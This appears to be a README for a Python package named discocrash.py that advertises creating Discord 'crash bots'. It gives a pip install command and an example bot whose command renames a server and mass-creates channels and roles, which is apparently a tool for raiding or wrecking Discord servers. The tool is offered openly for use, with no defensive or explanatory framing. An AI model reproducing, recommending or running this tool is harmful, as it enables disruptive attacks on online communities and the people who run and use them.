# discorash.py
This module can be used to create crash bots.



# Installing


```pip install discocrash.py```



# Example

```py
import disnake
from discocrash import crash
from disnake.ext import commands, tasks
import asyncio




intents = disnake.Intents.all()
bot = commands.Bot(command_prefix="your token", intents=intents)
bot.remove_command('help')
token = "your token"


@bot.command()
async def crush(ctx):
	await crash.crash(ctx, "crashed server name", "crash channel reason", "crash role reason", "crashed-channel-name", "crashed-role-name", 100, 10) #the penultimate parameter is responsible for how many channels will be created. The last parameter is responsible for how many roles will be created


bot.run(token)